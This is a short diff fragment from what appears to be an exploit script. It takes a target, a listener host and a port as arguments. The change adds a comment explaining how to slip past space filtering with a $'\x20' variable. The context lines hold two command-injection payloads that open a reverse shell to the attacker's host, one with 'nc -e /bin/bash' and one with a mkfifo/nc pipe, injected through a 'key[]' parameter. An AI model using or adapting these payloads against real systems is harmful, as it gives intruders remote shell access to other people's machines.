@@ -14,7 +14,8 @@ h =  args.t
 lhost = args.lh
 lport = args.lp
 
-#run a $nc -lvp 31337 on lhost;
+# run a $nc -lvp 31337 on lhost;
+# below we see how we can bypass space restrictions by exportig the arg s in the shell as \x20 s=$'\x20'. \ is URL encoded %5c
 nc_rev = "s=$'%5cx20';ls$s-ls;/usr/bin/nc$s\"" + lhost + "\"$s\"" + lport + "\"$s-e$s\"/bin/bash\"&key[]=%27%27"
 nc_noe = "s=$'%5Cx20';ls$s-la;rm$s-rf$s/tmp/bkp;mkfifo$s/tmp/bkp;/bin/bash$s0</tmp/bkp|nc$s\"" + lhost + "\"$s\"" + lport + "\"$s1>/tmp/bkp"
 
